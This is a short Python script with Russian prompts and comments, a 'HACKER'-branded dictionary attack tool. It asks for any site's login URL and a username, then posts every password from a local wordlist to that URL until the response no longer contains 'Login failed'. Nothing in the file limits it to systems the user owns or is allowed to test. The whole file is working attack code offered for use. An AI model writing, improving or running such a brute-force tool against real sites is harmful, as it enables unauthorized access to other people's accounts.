import os
import requests
from colorama import init, Fore
from art import *  # библиотека для ASCII-арта

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

# Очистка терминала при запуске программы
clear_terminal()

# ASCII-арт
text_art = text2art("HACKER")
print(Fore.CYAN + text_art)

# Ввод URL сайта
target_url = input('Введите URL сайта, к которому вы хотите подключиться для перебора паролей: ')

# Очистка терминала после ввода URL
clear_terminal()

# ASCII-арт после очистки
text_art = text2art("HACKER")
print(Fore.CYAN + text_art)

# Ввод логина
login_data = {
    'username': input('Введите логин: '),
    'password': ''
}

# Ввод минимальной длины пароля
min_password_length = int(input('Введите минимальную длину пароля: '))

# Очистка терминала после ввода логина и минимальной длины пароля
clear_terminal()

# ASCII-арт после очистки
text_art = text2art("HACKER")
print(Fore.CYAN + text_art)

# Чтение паролей из файла
passwords_file = '/storage/emulated/0/Download/словари/password.txt'
with open(passwords_file, 'r') as file:
    passwords = file.read().splitlines()

# Перебор паролей
for password in passwords:
    print(Fore.CYAN + f'Проверка пароля: {password}') # Вывод информации о текущем проверяемом пароле
    if len(password) < min_password_length:
        continue

    login_data['password'] = password
    response = requests.post(target_url, data=login_data)
    
    if 'Login failed' not in response.text:
        print(Fore.GREEN + f'Взломано! Найден пароль: {password}')
        break
    else:
        print(Fore.YELLOW + 'Не взломан, продолжаю...')
